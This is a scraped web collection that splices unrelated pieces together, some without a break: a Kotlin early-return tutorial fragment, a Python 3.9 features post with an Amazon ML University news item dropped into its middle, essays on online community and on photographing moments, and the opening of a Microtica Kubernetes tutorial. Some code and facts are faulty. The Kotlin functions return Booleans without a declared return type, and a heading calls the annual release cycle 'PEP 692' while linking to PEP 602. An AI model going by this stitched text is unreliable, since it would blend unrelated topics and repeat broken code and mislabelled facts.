
    <span>}</span>

    <span>return</span> <span>isTurtle</span>
<span>}</span></code></pre></figure> <p>After you have rewritten the checks on <strong>canSwim()</strong> it becomes clear you can do the same with the check on <strong>hasFourLegs()</strong> as well.</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>

    <span>if</span><span>(!</span><span>canSwim</span><span>())</span>

    <span>if</span><span>(!</span><span>hasFourLegs</span><span>())</span>

    <span>}</span>

    <span>return</span> <span>isTurtle</span>
<span>}</span></code></pre></figure> <p>You already cleaned up your code a lot. Only the check on <strong>isReptile()</strong> is left.</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>

    <span>if</span><span>(!</span><span>canSwim</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>if</span><span>(!</span><span>hasFourLegs</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>if</span><span>(!</span><span>isReptile</span><span>())</span>
        <span>return</span> <span>false</span>
    
    <span>// When this part is reached, we know our animal can swim, has four legs and is a reptile and therefore (probably) is a turtle.</span>

    <span>return</span> <span>true</span>
<span>}</span></code></pre></figure> <h2 id="adding-new-requirements">Adding new requirements</h2> <p>Finally to distinguish the turtle from the crocodile you come up with one final check. Does the animal have a shell? Now that you have written your code like a recipe it becomes trivial for you to add this new condition. A recipe can easily be read from top to bottom.</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>

    <span>if</span><span>(!</span><span>canSwim</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>if</span><span>(!</span><span>hasFourLegs</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>if</span><span>(!</span><span>isReptile</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>// Distinguish between turtles en crocodiles</span>
    <span>if</span><span>(!</span><span>hasShell</span><span>())</span>
        <span>return</span> <span>false</span>

    <span>return</span> <span>true</span>
<span>}</span></code></pre></figure> <p>Now you know the basics of rewriting a nested solution to a recipe. In this particular case there is an even more clean solution.</p> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>isTurtle</span><span>()</span> <span>{</span>
    <span>return</span> <span>canSwim</span><span>()</span> <span>&amp;&amp;</span> <span>hasFourLegs</span><span>()</span> <span>&amp;&amp;</span> <span>isReptile</span><span>()</span> <span>&amp;&amp;</span> <span>hasShell</span><span>()</span>
<span>}</span></code></pre></figure> <h2 id="but-arent-early-returns-a-bad-thing">But, aren’t early returns a bad thing?</h2> <p>Some would argue that early returns make your code harder to understand because there are multiple places where you method could end. In my experience this is never a problem until your methods become very long and complex. When this happens you should probably deal with those long methods instead i.e. by reducing their length and complexity first.</p> <h2 id="the-recipe">The Recipe</h2> <p>The general recipe is as follows:</p> <ol> <li>Try to do X</li> <li>If X didn’t work -&gt; stop</li> <li>continue with the assumption that X worked</li> </ol> <p>In the following example you can see this pattern at work. The fridge in this example is a simple <a href="https://en.wikipedia.org/wiki/Finite-state_machine">state machine</a> and all illegal transitions will throw an exception.</p> <blockquote> <p>You can try this code out by copying it to the <a href="https://play.kotlinlang.org/">kotlin playground</a></p> </blockquote> <figure><pre><code data-lang="kotlin"><span>fun</span> <span>main</span><span>()</span> <span>{</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
                

<p>As of 2020-08-11, the first release candidate of Python 3.9 <a href="https://www.python.org/downloads/release/python-390rc1/">has been released</a> - officially making it Christmas in August; let’s open presents.</p>



<p><em>Vaguely ordered by ascending excitement.</em></p>

<h2 id="native-dict-unions">Native Dict Unions</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0584/">PEP 584</a>: Add union operators to dict</em></p>

<p>At the moment, if you want to merge a couple of dicts, the primary methods are to use either <code>{**first_dict, **second_dict}</code> or <code>first_dict.update(second_dict)</code> (which modifies <code>first_dict</code> in-place):</p>


<pre><code>a = {0: 0, 1: 0, 2: 0}
b = {1: 1, 2: 2, 3: 3}

self.assertEqual({**a, **b}, {0: 0, 1: 1, 2: 2, 3: 3})

# `b` is modified in-place
b.update(a) 

self.assertEqual(b, {0: 0, 1: 0, 2: 0, 3: 3})
</code></pre>

<p>The syntax introduced in Python 3.9 is a lot more straightforward, allowing you to merge dicts with a pipe, e.g. <code>first_dict | second_dict</code> or <code>first_dict |= second_dict</code> (which, again, modifies <code>first_dict</code> in-place).</p>

<p>The order of the dicts still matters, i.e. whichever dict comes last will take precedence when there are key collisions.</p>


<pre><code>a = {0: 0, 1: 0, 2: 0}
b = {1: 1, 2: 2, 3: 3}

# `b` colliding keys `1` and `2` still take precedence over `a`
self.assertEqual(a | b, {0: 0, 1: 1, 2: 2, 3: 3})

# `b` is modified in-place
b |= a

# `a` colliding keys `1` and `2` still take precedence over `b`
self.assertEqual(b, {0: 0, 1: 0, 2: 0, 3: 3})
</code></pre>

<h2 id="native-string-pre-suf-fix-removal">Native String (Pre|Suf)fix Removal</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0616/">PEP 616</a>: String methods to remove prefixes and suffixes</em></p>

<p>It’s hard to overstate how often I need to strip prefixes or suffixes - and doing it in Python has been pretty verbose up to now.</p>


<pre><code># Stripping a prefix
if some_str.startswith(some_prefix):
    some_str = some_str[len(some_prefix):]

# Stripping a suffix
if some_str.endswith(some_suffix):
    some_str = some_str[:-len(some_suffix)]
</code></pre>

<p>Yeah, you can collapse these to one liners, but it’s still ugly as hell - and God forbid you need to do both at the same time.</p>

<p>I’m thrilled that <code>removeprefix</code> and <code>removesuffix</code> are finally available in Python 3.9:</p>


<pre><code># Stripping a prefix
some_str = some_str.removeprefix(some_prefix)

# Stripping a suffix
some_str = some_str.removesuffix(some_suffix)

# What the hell? Let's do both!
some_str = some_str.removeprefix(some_prefix).removesuffix(some_suffix)
</code></pre>

<h2 id="standard-collection-type-annotations">Standard Collection Type Annotations</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0585/">PEP 585</a>: Type hinting generics in standard collections</em></p>

<p>This is a feature I’ll be using every day. If you use type annotations to a serious extent, you’ll probably be familiar with some version of the following:</p>


<pre><code>from typing import Dict, List, Set

str_dict: Dict[str, str] = {
   "only": "strings",
   "nothing": "else",
}

float_list: List[float] = [1.1, 2.2, 3.3]

int_set: Set[int] = {1, 2, 3}
</code></pre>

<p>To get the benefits of type checking, you either have to import from <code>typing</code> (like above) or import <code>annotations</code> from <code>__future__</code>.</p>

<p>It’s just an import, but it can add up in a large project - especially if you find yourself copying any type-annotated code from one file to another (or, say, from StackOverflow).</p>

<p>With 3.9, things will be a bit cleaner:</p>


<pre><code>str_dict: dict[str, str] = {
   "only": "strings",
   "nothing": "else",
}

float_list: list[float] = [1.1, 2.2, 3.3]

int_set: set[int] = {1, 2, 3}
</code></pre>



<p><em>I’m not not excited.</em></p>

<h2 id="type-annotation-annotations">Type Annotation.. Annotations?</h2>

<p><em><a href="https://www.python.org/dev/peps/pep-0593/">PEP 593</a>: Flexible function and variable annotations</em></p>

<p>As more Python libraries leverage type annotations, there’s value in giving a flexible way to add metadata alongside particular types. This PEP introduces the <code>Annotated</code> construct which takes a type and an arbitrary list of arguments that serve as metadata, e.g.</p>


<pre><code>Annotated[float, ValueRange(42, 420)]
Annotated[int, IsDivisibleBy(4), IsAfraidOfSeven(False)]
Annotated[tuple, MinLen(1), MaxLen(7)]
</code></pre>

<p>To support these annotations, <code>typing.get_type_hints</code> is changing to provide an <code>include_extras</code> kwarg (defaulting to <code>False</code> for backwards compatibility) that indicates whether to return this additional metadata.</p>

<p>I see how this could be a pretty useful PEP for libraries, but I don’t see a use for it in my own work, yet.</p>



<p><em>Not throwing shade or anything. Just don’t see these changing my life very much.</em></p>

<h2 id="pep-615-https-www-python-org-dev-peps-pep-0615-support-for-the-iana-time-zone-database-in-the-standard-library"><strong><a href="https://www.python.org/dev/peps/pep-0615/">PEP 615</a>: Support for the IANA time zone database in the standard library</strong></h2>

<p>This is a PEP that I need to spend more time with to really understand. My ridiculously dumbed-down (due to me, not you) summary is that it introduces a new <code>zoneinfo</code> API that replaces a lot of the functionality that you’d normally want to use <code>pytz</code> for, e.g.</p>


<pre><code>from zoneinfo import ZoneInfo
from datetime import datetime

zone = ZoneInfo("America/Denver")
dt = datetime(2020, 12, 9, 6, tzinfo=zone)
</code></pre>

<h2 id="pep-692-https-www-python-org-dev-peps-pep-0602-annual-release-cycle-for-python"><strong><a href="https://www.python.org/dev/peps/pep-0602/">PEP 692</a>: Annual release cycle for Python</strong></h2>

<p>Python releases once a year now.</p>

<h2 id="pep-617-https-www-python-org-dev-peps-pep-0617-new-peg-parser-for-cpython"><strong><a href="https://www.python.org/dev/peps/pep-0617/">PEP 617</a>: New PEG parser for CPython</strong></h2>

<p>Probably only relevant if you work on CPython or have an interest in compilers.</p>

<p>Amazon makes its machine learning course — Amazon Machine Learning University — free for everyone to access and learn the most in-demand skills. Earlier, the course was only available for the employees of Amazon. But, it has now been made public for anyone to access and learn machine learning skills such as computer vision and natural language processing and analyzing tabular data.</p>



<p>Initially, the tech giant started the Amazon Machine Learning University in 2016 to upskill its employees. Over the years, the course was used by various teams such as Alexa science, Amazon Go, and more, to implement the latest machine learning techniques in their work. The courses are being taught by Amazon ML experts, thereby providing all the necessary skills required for an individual to blaze a trail and deliver promising AI-based solutions.</p>

<p>Currently, only three courses have been hosted on <a href="https://www.youtube.com/channel/UC12LqyqTQYbXatYS9AA7Nuw/playlists" target="_blank" rel="noreferrer noopener">YouTube</a> by Amazon but by the end of the year, they will include nine more courses. And from 2021, all the classes will be available via on-demand video, along with associated coding materials.</p>



<p>The first three courses: <a href="https://www.youtube.com/watch?v=0FXKbEgz-uU&amp;list=PL8P_Z6C4GcuWfAq8Pt6PBYlck4OprHXsw" target="_blank" rel="noreferrer noopener">NLP</a>, <a href="https://www.youtube.com/watch?v=_6CFi2CO2AI&amp;list=PL8P_Z6C4GcuU4knhhCouJujFZ2tTqU-Ta" target="_blank" rel="noreferrer noopener">Computer Vision</a>, <a href="https://www.youtube.com/watch?v=kj-sPC6pai4&amp;list=PL8P_Z6C4GcuVQZCYf_ZnMoIWLLKGx9Mi2" target="_blank" rel="noreferrer noopener">Tabular Data</a>, will cover a wide range topic. As of now, there are more than 67 videos in three courses combined. Amazon will also be updating its machine learning courses for free as technology advances.</p>



<p>The courses are structured in a way that they will help solve business problems in various domains. In addition, the courses incorporate the book <a href="http://d2l.ai/" target="_blank" rel="noreferrer noopener">Dive into Deep Learning</a> authored by Amazon scientists.&nbsp;</p>



<p>“We want to make sure we’re teaching the important things up front and that we’re making good use of students’ time,” he says. “With the transition to working from home, it’s even harder now for class participants to set aside multiple hours of time. We want to be flexible in how people can take these classes.” Brent Werness, AWS research scientist.</p>

<p>People <em>loved </em>Startup Weekend – especially in the days before the Techstars acquisition. And yes, some notable companies like Zaarly, Beardbrand, and Zapier were started at a Startup Weekend…but people didn’t love Startup Weekend for the “companies” that were started there.</p>
<p>People loved Started Weekend for the community.</p>

<p>And I loved what it felt like to create that space for people. So I kept creating community: from organizing Startup Weekends in the early 2010s to throwing house concerts in 2014-2016.</p>
<p>Then in 2017, I started an online accelerator program, Unreal Collective. That program gave rise to its own online community and <a href="https://unrealcollective.com/community">it’s my favorite place</a> to spend time online.</p>
<p>And that all led to this year, when I was given the opportunity to work with Pat Flynn and the Smart Passive Income team to create their paid, online membership community, <a href="https://www.smartpassiveincome.com/pro">SPI Pro</a>, using <a href="https://jayclouse.com/circle" target="_blank" rel="noopener noreferrer">Circle</a> (more about that <a href="https://www.smartpassiveincome.com/podcasts/taking-business-next-level-spi-pro/">on SPI episode 429</a>).</p>

<p>This opportunity to build an online community from the ground up gave me the excuse to really study what it means to build community (both online and offline) and validate a lot of my own assumptions.</p>
<p>And tl;dr: I’m all in on <a href="https://jayclouse.com/circle" target="_blank" rel="noopener noreferrer">Circle</a>, and I’ll explain why below.</p>
<p>But before I can share all the lessons learned, we need to start from the beginning.</p>

<h2>What is community?<span></span></h2>
<p>Community means a lot of different things to different people. To me, community is a group of people with commonality – shared interests, values, or beliefs.</p>
<p>With Startup Weekend, we all shared an interest in technology, but we also shared values like ambition, kindness, and generosity too.</p>
<p>At any given Startup Weekend event, I knew I’d leave with some new, lifelong friendships. And the connection I felt with other people at a Startup Weekend is what made that community so special.</p>
<p>In fact, connection is what makes <em>any </em>community special.</p>
<p>I believe people are drawn to community for three core reasons:</p>
<ol>
<li>Human connection</li>
<li>Transformation</li>
<li>Finding a sense of identity</li>
</ol>
<p>Let’s break each of those down.</p>
<h3>Human connection</h3>
<p>The experience of community goes back to the beginning of humans. We’re a social species and we relied on cooperation to survive.</p>
<p>Community was built into our lives when we lived in a tribal setting. Our community was the people we lived around day in and day out – the people we hunted and gathered with!</p>
<p>We felt that we <strong>belonged </strong>to that tribe. And there’s a lot of comfort in belonging.</p>
<p>As civilization evolved, humans became more socially isolated. Forget about living in tribes – we want to move out of our parents’ house and into our own studio apartments as quickly as we can!</p>
<p>But our brains haven’t actually evolved past that desire for close social connections – our lifestyle has. Our cultural expectations have.</p>
<p>And so we seek out that missing human, social connection elsewhere. We seek out that sense of belonging that we’re missing.</p>
<p>We seek out community.</p>
<h4>Connection through shared experience</h4>
<p>Often, one of the easiest ways to find connection is through shared experience. When we share an experience together, whether it’s a tailgate, an escape room, or starting at a new school, we start from a known commonality.</p>
<p>Commonalities give humans something to talk about and bond over. It’s that shared experience that starts conversation, creates a relationship, and ultimately makes us feel connected to one another.</p>
<h3>Transformation</h3>
<p>We also look to other humans to help us grow.</p>
<p>And when we’re looking to make a change, there are communities there to help.</p>
<p>A great example here is the Crossfit or any fitness-based community. When you join a fitness community, you’re seeking very tangible, physical transformation.</p>
<p>Physical transformations (gaining muscle, losing weight) are easy to recognize in ourselves. We seek out psychological and knowledge transformations too – though they may be a little little harder to recognize.</p>
<p>But when you join a coding bootcamp and leave being able to build a web app, you see the transformation.</p>

<h3>A sense of identity</h3>
<p>Most of us are in a constant battle to understand ourselves. With social media and comparison traps around us all the time, a lot of us have a hard time really knowing who we are and what we care about.</p>
<p>When you ask someone to introduce themselves, they’ll probably launch right into their work. “I’m [position] at [company].”</p>
<p>Our work shouldn’t define our identity – but it gives us something to tether ourselves to when we don’t have a better sense of who we are.</p>
<p>Community provides an alternative.</p>
<p>When someone joins a community, connects with others or experiences transformation, they learn something about themselves. They learn more about their own interests, and those interests may be stronger than their day-to-day work.</p>
<p>That’s why we see so many people identify with Crossfit or Yoga or even volunteering for a nonprofit.</p>

<h4>Finding identity in a movement</h4>
<p>Sometimes, community offers us the opportunity to identify with an idea bigger than ourselves. These communities go beyond shared values and actually call their community members to action.</p>
<p>These communities become a movement. People join a movement because they want to see change, and every member of the community powering a movement has the same shared goal.</p>
<p>When we are part of a movement, we feel that same belonging and connection of other communities, but may even begin to identify with that movement.</p>
<p>And, of course, the best movements exist to create change (transformation) too.</p>
<p>So, any way you slice it, the most thriving communities help us find connection, facilitate transformation, or help us to better understand ourselves and our identity.</p>
<h2>Building community in real life<span></span></h2>
<p>We’ve been part of communities throughout our whole lives. Your graduating class, the clubs you joined in high school or college, your college dorm, local meetup groups…</p>
<p>Any group that you’ve belonged to through shared interests or shared experience is, on some level, a community.</p>
<p>A graduating class is a social cohort with a shared goal: complete your courses, graduate on time. You have the shared experience of joining that cohort at the same time, and you’re pursuing the same transformation: becoming a graduate.</p>
<p>Meetup groups are built around shared interests like painting, anime, yoga, or anything else. We go to these meetups because we feel like we belong there.</p>
<p>We’ve gotten <em>really good </em>at creating in person, analog communities – we’ve had all of evolutionary history to figure it out!</p>
<p>As long as we have a reason for gathering people into a common space, it’s easy to convey that reason and create a sense of belonging.</p>

<p>But analog community is much easier than digital community, because <strong>physical space creates discomfort</strong>. When we show up to a space and may not immediately recognize anyone, we’re filled with equal parts fear and excitement.</p>
<p>We’re afraid to be alone. We’re afraid that the group will decide that we don’t belong. But at the same time, we’re eager for connection.</p>
<p>And that discomfort creates a healthy tension that we often solve by walking up to someone, extending our hand, and saying, “Hi, I’m Jay.”</p>
<p>That’s the magic of physical space. If we show up, we will usually push through the discomfort of feeling like we don’t belong until we feel like we do.</p>
<p>After all, it’s equally embarrassing to walk right back out the door in front of everyone. People who we may see again in our local community!</p>
<p>And in great communities, existing members will notice anyone feeling that discomfort and welcome them in.</p>
<h2><span id="why-many-online-communities-fail"></span>Why many online communities fail<span></span></h2>
<p>On its face, it seems like it should be easy to translate analog communities into digital communities. And even better, because they’re digital, they can scale! You don’t <em>need </em>to be in the same city to connect over your shared love of <em>Hamilton</em>.</p>
<p>But, very quickly, most online communities fall flat.</p>
<h3>The wrong motivation for building your online community</h3>
<p>Many online communities are started purely for selfish reasons. The creator thinks of it as purely an effort to build their audience.</p>
<p><em>If I create a community, it will self-govern, people will invite others in, and my brand will be at the center of their universe.</em></p>
<p>When creators follow <em>this </em>logic – when the online community is built to serve the creator – it’s doomed from the start.</p>
<p>Community has to be about serving people. If you aren’t serving people – if people aren’t finding connection, transformation, or identity within the space – then it will fail.</p>
<p>And any community managers will tell you, fostering online community is a LOT of time and a LOT of work.</p>
<p>If you aren’t planning to dedicate a huge amount of time and resources from the beginning…if you believe that the community will be so emergent that it will self-govern and thrive from day one, you’re wasting your time.</p>
<h3>Lack of intention in building your online community</h3>
<p>In the analog world, if we have a reason for gathering and a space to gather in, the hardest part is just bringing people into that space.</p>
<p>Because as I shared before, the discomfort of feeling like an outsider in a physical space will propel us into connecting with people until we no longer feel like an outsider.</p>
<p>So in the world of online communities, we overestimate the power of the platform. Tools like Discord, Discourse, Slack, Mighty Networks, and Facebook Groups all promise to give you the ROOM to gather your online community.</p>
<p>So creators pick their favorite tool and create an account.</p>
<p>Sometimes the creators of these communities do a really good job of configuring that digital space with specific channels and spaces for specific causes too.</p>
<p>In theory, that’s great! Of course a thriving online community would utilize all of these specific spaces so that they could have even more confidence that <em>this </em>area is …</p></div></div>

August 14, 2020 | https://docayomide.com/capture | <a href="https://web.archive.org/web/*/https://docayomide.com/capture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="bsf_rt_marker"><h2>A conversation about time, identity and Instagram</h2><p><em>This essay started in the Twitter DMs, with a question by <a rel="noreferrer noopener nofollow" href="https://adamtank.com/" target="_blank">Adam Tank</a>, a fellow <a rel="noreferrer noopener nofollow" href="https://writeofpassage.school/" target="_blank">Write of Passage</a> alum, leader of our little writers’ band and convener of our weekend writing sessions. Adam’s question sparked a fun conversation that we decided to capture in an essay that’s special in two ways. One, it’s my first co-created essay (but Adam’s <a rel="noreferrer noopener nofollow" href="https://www.adamtank.com/new-blog/2020/4/30/the-cost-of-writing-well" target="_blank">second</a>), and two, we framed it as a conversation, in honour of the ancient Greek philosophers and modern rappers! (<a rel="noreferrer noopener nofollow" href="https://twitter.com/artank" target="_blank">Follow Adam</a> on Twitter—he’s fun!)</em></p><hr><p><strong>Adam: </strong>A friend of mine recently posted this photo to her Instagram timeline—a sign handcrafted by her father to announce her “unplugged wedding.”</p><p>She’s encouraging wedding guests to be present and enjoy the moment rather than being caught up in taking photos. It’s clear that she values presentness over capture. But when asked if she planned to have a professional photographer at the wedding she enthusiastically responded “Yes! And a videographer!”&nbsp;</p><p>In this example, the distinction of being present in a moment vs. capturing it is particularly intriguing. There is value in being present, as she suggests with the unplugged wedding. But there is also value in capturing the moment, as she plans to hire a photographer and videographer. So one of the questions I’m now asking myself is if it’s wrong to want to capture a moment? Would it be wrong to sneak a cell phone picture in at her wedding?&nbsp;</p><p>I think about how fortunate we are to have camera technology at our fingertips that our ancestors could have only dreamed of. Imagine seeing your child getting married and thinking, “If only I could live in this moment forever”, and not being able to have a photograph of the moment.&nbsp;</p><div><p><strong>Ayomide:</strong>&nbsp;I actually don’t think the issue is that we try to capture moments. I think it’s&nbsp;<em>how</em>&nbsp;we do that which trips us up. Memory itself is a form of capture, right? So is journaling, which humans have done since writing was invented. And even before that was painting, used by unknown people who turned cave walls into their canvas for capturing hunts. And let’s face it, so is every love song, every poem about heartbreak, and every ballad about some hero. Capturing moments that mean something to us is part and parcel of what it means to be human.</p><p><strong>Adam:&nbsp;</strong>That’s true—humans have been capturing moments forever; it’s just the means and technology that’s changed. It’s only been recently (in the last few hundred years) that we’ve had cameras, and only in the last 20 years were cameras integrated into cell phones. The “how” of how we’re capturing moments has changed dramatically in a very short amount of time.</p></div><p><strong>Ayomide:&nbsp;</strong>When I think about what has mainly changed in how we capture, and compare the majority of human history with just the twenty years of the 21st century, the word that comes to my mind is&nbsp;<em>asynchronous</em>. Thanks to powerful computers that let us act at the speed of thought, we have moved from asynchronous to synchronous capture.&nbsp;</p><p>But there’s two problems with that. One is that thought often needs some time to be processed before it can be transformed into meaningful narrative and action. The other is that the very act of observing what we are thinking about changes the thought. The&nbsp;<a href="https://en.wikipedia.org/wiki/Observer_effect_(physics)" target="_blank" rel="noreferrer noopener nofollow">observer effect</a>&nbsp;in physics comes to mind: the idea that the very act of observing something changes it. Here it would be that our attempt to capture a moment&nbsp;<em>in the moment</em>&nbsp;may well kill that very moment.&nbsp;<strong>In promising us instant capture tech has taken away being present.</strong></p><p><strong>Adam:&nbsp;</strong>I&nbsp;<em>love</em>&nbsp;that line. The tradeoff between capture and presentness has become far more dramatic because of advances in technology. I’ve had this photo in my Twitter header for a couple of years and it perfectly distills the essence of what we’re talking about:&nbsp;<img data-src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7ac35625-8910-4ef1-9e0d-01d9979ddb9e_1500x500.png" alt="" data-old-src="image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F7ac35625-8910-4ef1-9e0d-01d9979ddb9e_1500x500.png"></p><p>This tradeoff, the old lady’s presentness vs. the swarm of younger, technologically enabled capturers is so beautifully apparent. If I think about moments of my childhood that were captured in photographs, my parents were attempting to capture a single, fleeting moment in time. My first steps, the birth of my sister, graduating high school… all of these are naturally occurring, singular moments in time that cannot be replicated.&nbsp;</p><p>But the proliferation of cell phone cameras has flipped the idea of capturing a moment on its head.&nbsp;<strong>People now&nbsp;</strong><em><strong>create</strong></em><strong>&nbsp;moments in order to capture them</strong>—literally doing it for the ’gram. The present is viewed through the lens of a manufactured future—what can I create&nbsp;<em>now</em>&nbsp;so that I can share with others&nbsp;<em>later</em>—which defeats the purpose of the present! You can’t be present if you’re always in the future.</p><p><strong>Ayomide</strong>: Exactly, and some would suggest what appears the obvious solution: that we should simply be in the moment, instead of trying to capture it. But why choose? Why not, as I like to ask with questions like this, try for both? From that angle, one way to get around the synchronicity issue would be to have someone else capture the moment while we experience it. Let’s call this person a&nbsp;<strong>Designated Capturer</strong>: just like having a designated driver means you can drink without having to worry about driving, a designated capturer would let you both experience the moment&nbsp;<em>and</em>&nbsp;faithfully capture it.&nbsp;</p><p><em>Basically you’re shifting the asynchronicity to another person rather than another time.</em>&nbsp;And your friend (like many others) seems to have intuitively realised this. That suggests the designated capturer is not a new concept, just an unnamed one, and understandably given the newness of this tech. And speaking of naming things, that itself is a form of capturing—to name a thing is to increase our awareness of it, make it more real.</p><p><strong>Adam:</strong>&nbsp;A professional photographer really serves two purposes. The first, the obvious, is that a photographer can capture a moment in a way that an amateur cannot. By framing a scene, shooting from various angles, considering the importance of lighting, and using top tier equipment, the professional can tell a story about a moment that will make you&nbsp;<em>feel</em>&nbsp;like you were there and evoke emotion within you.&nbsp;</p><p>The second, and less obvious, is that a designated capturer can free you to be present in a given moment.&nbsp;<strong>By hiring a professional, you no longer have the psychological burden of feeling the need to capture AND to be present.</strong>&nbsp;I think it’s the more important function of the two.&nbsp;</p><div><p>Out of curiosity I looked up the root words for photography.&nbsp;<em>Photo</em>, meaning “light”, and&nbsp;<em>graphy</em>, meaning draw. A photographer is literally “drawing with light”—creating an enlightening experience for the person viewing a photograph after it’s been taken.&nbsp;</p><p><strong>Ayomide</strong>: “Drawing with light” should be the dictionary definition of photography! A photo captures the moment, but like a painting or sculpture, also offers a handle on the context surrounding that moment. Like when you’re on a tour and you see a statue, and the tour guide tells you its story and why it’s more than just bronze. A photo is like that, except you’re also the tour guide. It captures a moment to later trigger a memory of other moments, including before and after the one in the photo. You don’t want to lose that context of that moment in the very attempt to capture it.&nbsp;</p></div><p>That’s why high school reunions fall flat, or returning to your childhood street. You have these fond memories (if you’re lucky) of your street or school, and then one day you get a chance to relive them—to see your high school friends, to return to your childhood street. Of course we often end up regretting that, because it’s not quite the same. The friends feel hollow, the street feels dull, even when they haven’t changed that much—you have.&nbsp;</p><p>Were you really better off knowing the “truth” about that past moment, or are you better off with the good memories you had of it? That’s a trick question, though, because what we call our “memories” are really stories that we put together from our snapshots of the past—the snapshots alone can’t live up to our stories.</p><p><strong>Adam:&nbsp;</strong>It’s such a great question and one many of us can relate to, especially the part about reliving childhood memories. The truth is often a disappointing version of a memory you hold dearly. The spaceship you had built is a heap of cardboard boxes; the castle a musty sofa surrounded by yellowed pillows.&nbsp;</p><p>There was a science fiction novel written in 1760,&nbsp;<em><a href="https://en.wikipedia.org/wiki/Giphantie" target="_blank" rel="noreferrer noopener nofollow">Giphantie</a></em>, whose author described something quite similar to color photography, and said that once you complete the process “…<em>you have a picture the more precious in that no art can imitate its truthfulness.</em>” In this way a photo can serve as “truth” but&nbsp;<em>also&nbsp;</em>allow you to keep the memories you hold most dear, because your brain remembers (or creates!) the context around the photo.&nbsp;</p><p>Maybe this is why we take a photo in the first place, as a way to trigger memories. Secondarily we use them to share those memories with others in a more “real” way. How better to describe a moment in time to someone who wasn’t there than with a photo? After all, they are “worth a thousand words.”</p><p><strong>Ayomide:</strong>&nbsp;Exactly. The photo then becomes a way to turn the personal memory to a shared one. And because memory is part of identity, that can be shared identity as well. I find that interesting, by the way: our memory is a fundamental aspect of our identity, but in such a quiet way we almost never think about it. Imagine, though, waking up tomorrow morning to realise you couldn’t recall anything about your life before you woke up. It was all just gone. The connection becomes immediately obvious. It’s why we have so many films about people who have lost their memory—they’re really exploring identity:&nbsp;<em>Who are you without your memories?</em>&nbsp;Which goes back to how identity is the story we believe about ourselves.&nbsp;</p><p><strong>Any answer we give to “Who are you?” is really a story. And the building blocks for the story include our beliefs and values and personality and relationships, and crucially, our memory. When we capture, we’re trying to save those building blocks. It’s a form of information compression.</strong></p><p><strong>Adam:&nbsp;</strong>So how can we find more ways …</p></div></div>

August 14, 2020 | https://microtica.com/deploy-your-first-microservice-on-kubernetes-in-10-mins/ | <a href="https://web.archive.org/web/*/https://microtica.com/deploy-your-first-microservice-on-kubernetes-in-10-mins/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>Kubernetes is the most popular open-source platform for managing containerized workloads and services. Kubernetes abstracts the underlying infrastructure layer. As a result, developers can focus on building applications, then deploy them to any of those environments.</p>



<p>To bring Kubernetes closer to developers, we’ve created a ready-to-use <a href="https://github.com/microtica-components/component-aws-eks" target="_blank" rel="noreferrer noopener">infrastructure component for Kubernetes</a>. This component uses AWS EKS as a service and sets Kubernetes master and nodes in auto-scaling infrastructure setup. Nodes are EC2 instances based on Kubernetes optimized AMIs.</p>



<blockquote><p><em>Components are a core concept in Microtica which allow developers to create and release their custom Cloud infrastructure setup in a standardized way. A</em>fter <em>the component is created, it can be reused in as many projects and environments as needed.</em></p></blockquote>



<p>In addition to the <a rel="noreferrer noopener" href="https://microtica.com/start-creating-infrastructure-on-aws-like-a-pro/" target="_blank">infrastructure setup</a> for Kubernetes, <a rel="noreferrer noopener" href="http://www.microtica.com/" target="_blank">Microtica</a> also offers you CI and CD for microservices. This means that you don’t have to worry about the complex details of the integration with Kubernetes. With this, we cover the whole process of software and infrastructure delivery.</p>



<p>In this article, we will learn how to <strong>deploy a microservice in the cloud with our Kubernetes component</strong>. Let’s get started by <a rel="noreferrer noopener" href="https://portal.microtica.com/register" target="_blank">creating your account</a> and project in Microtica. To deploy your first microservice in under 10 mins, follow these steps:</p>



<h3><strong>1. Add your AWS Account</strong></h3>



<p>First, go into <em>Settings</em>, then <em>AWS Accounts </em>tab, then <em>Add New Account</em>. Follow the steps to connect your account.</p>



<p><em>Note: All resources will be created on the provided AWS account, expenses will be calculated according to AWS pricing for using the services.</em></p>



<h3><strong>2. Create an environment</strong></h3>



<p>With a connected AWS account, you can continue to create your environment in which you’ll deploy your infrastructure. <a href="https://portal.microtica.com/environments/create" target="_blank" rel="noreferrer noopener">Create an environment</a> following the wizard on Microtica and then continue to add the components we will need.</p>



<h3><strong>3. Add components</strong></h3>



<p>To successfully setup a working Kubernetes Cluster in which we’ll deploy a microservice, we will need only 2 components: a <strong>VPC component </strong>and of course a <strong>Kubernetes Cluster component</strong>. We need the VPC (Amazon Virtual Private Cloud) component to enable us to launch AWS resources into a virtual network that we’ve defined. This virtual network is dedicated to your AWS account. This component sets one AWS VPC, and four subnets (2 public and 2 private subnets).</p>



<p>Here’s how to configure your components to connect them and create the infrastructure.</p>

<p>When configuring the parameters for the Kubernetes Cluster component you can reference the VPC component so you <strong>don’t have to manually reenter the values</strong>. Microtica will take care of the order in which the components will be deployed in the cloud. This will allow you to have a working environment.</p>

